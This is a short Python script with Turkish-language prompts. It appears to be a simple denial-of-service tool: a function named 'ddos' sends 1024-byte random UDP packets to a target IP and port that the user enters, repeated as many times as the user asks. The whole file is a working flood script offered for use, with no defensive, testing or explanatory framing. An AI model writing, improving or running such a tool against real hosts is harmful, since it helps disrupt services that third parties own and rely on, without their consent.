import socket
import random
import time

def ddos(ip, port):
    data = random.randbytes(1024)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(data, (ip, port))
    sock.close()

if __name__ == "__main__":
    ip = input("Hedef IP adresi: ")
    port = int(input("Hedef port numarası: "))
    count = int(input("Kaç paket gönderilsin: "))

    for i in range(count):
        print(f"Paket gönderiliyor: {i+1}/{count}")
        ddos(ip, port)
        time.sleep(0.1)